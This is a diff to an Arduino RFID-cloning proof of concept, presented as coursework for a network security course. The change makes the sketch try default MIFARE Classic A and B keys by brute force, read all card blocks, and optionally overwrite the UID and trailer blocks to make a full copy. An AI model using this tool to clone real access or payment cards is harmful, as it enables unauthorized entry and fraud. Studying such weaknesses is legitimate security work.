@@ -4,9 +4,16 @@
  * Please don't break any laws with this. I hold no responsibility for any misuse of this program, this is a proof of concept designed for a network security course.
  * 
  * @author Ludvig Lindblad
- * @version 0.5 2021/03/21
+ * @version 0.6 2021/07/27
  * Full project: https://github.com/pinmissile/MIFARE-Classic-Copier
  */
+ 
+/* 
+ *  Set the full_copy variable to true if you want to make a full copy of a card.
+ *  This is potentially dangerous, as it will overwrite the UUID of the card and potentially lock the card from further write operations.
+ *  However, some systems use the UUID as authentication, or store data in the authentication blocks. So it might be necessary.
+*/
+#define full_copy false 
 
 // Library imports
 #include <SPI.h>
@@ -19,7 +26,8 @@
 #define SS_PIN 10
 
 MFRC522 mfrc522(SS_PIN, RST_PIN);
-MFRC522::MIFARE_Key key;
+MFRC522::MIFARE_Key key_a;
+MFRC522::MIFARE_Key key_b;
 MFRC522::StatusCode status;
 
 #define PREPROGRAMMED_KEYS 8 // Number of known default keys
@@ -86,13 +94,13 @@ bool await_and_copy_card(){
       return false; // Wait until a card shows up.
   digitalWrite(YELLOW_LED_PIN, HIGH);
   // Attempt to crack.
-  if(find_key(&key)){
+  if(find_key(&key_a, true) && find_key(&key_b, false)){
     // Copy the card to RAM
     for(byte block = 0; block < 64; block++){
       byte byteCount = sizeof(buffer);
       status = mfrc522.MIFARE_Read(block, buffer, &byteCount);
       for (int p = 0; p < 16; p++) {
-        rfid_data[block][p] = buffer[p];
+             rfid_data[block][p] = buffer[p];
       }
     }
     mfrc522.PICC_HaltA();       // Halt PICC
@@ -113,15 +121,15 @@ bool await_and_write_card(){
   if ( !mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial())
       return false; // Wait until a card shows up.
   digitalWrite(YELLOW_LED_PIN, HIGH);
-  if(find_key(&key)){
+  if(find_key(&key_a, true) && find_key(&key_b, false)){
     // Writing to card block-for-block, don't remove it or you might brick it.
-    for(int block = 4; block <= 62; block++){ // Write block for block
-      if(block % 4 == 3){ 
-        block++; // These are authentication blocks. Skip them to avoid bricking the card.
+    for(int block = 0; block <= 62; block++){ // Write block for block
+      if(!full_copy && (block % 4 == 3 || block < 4)){ 
+        block++; // Skips the first block, as well as authentication blocks.
       }
 
       // Authenticate A-key
-      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid));
+      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key_a, &(mfrc522.uid));
       if (status != MFRC522::STATUS_OK) {
         // Failed authentication.
         blink_led(YELLOW_LED_PIN, 1000);
@@ -129,7 +137,7 @@ bool await_and_write_card(){
       }
 
       // Authenticate B-key
-      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B, block, &key, &(mfrc522.uid));
+      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B, block, &key_b, &(mfrc522.uid));
       if (status != MFRC522::STATUS_OK) {
         // Failed authentication.
         blink_led(YELLOW_LED_PIN, 1000);
@@ -159,9 +167,11 @@ bool await_and_write_card(){
  * Function which brute forces the encryption key with current card in communication, using the preprogrammed keys in memory.
  * If the key is found, it will mutate the key variable to that key.
  * 
+ * @param int MFRC522::MIFARE_Key MIFARE Key structure
+ * @param boolean check_a True for key A, false for key B.
  * @return Successful key match
 */
-bool find_key(MFRC522::MIFARE_Key *key){
+bool find_key(MFRC522::MIFARE_Key *key, boolean check_a){
   MFRC522::MIFARE_Key temp_key;
   for (byte k = 0; k < PREPROGRAMMED_KEYS; k++) {
     // Copy the key into the MIFARE_Key structure
@@ -172,9 +182,13 @@ bool find_key(MFRC522::MIFARE_Key *key){
     *key = temp_key;
     // Test it with the card
     for(byte block = 3; block < 64; block += 4){
-      // Since a lot of cards tend to use the same encryption key for both the card's A- and B-key, we only bother with testing the A-key in order to conserve time.
       // If you're looking for a more sophisticated system, check out MFCUK (MiFare Classic Universal Toolkit).
-      status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, key, &(mfrc522.uid));
+      if(check_a){
+        status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, key, &(mfrc522.uid));
+      }
+      else{
+        status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B, block, key, &(mfrc522.uid));
+      }
       if (status == MFRC522::STATUS_OK) {
         // Key found and stored in the key variable.
         return true;
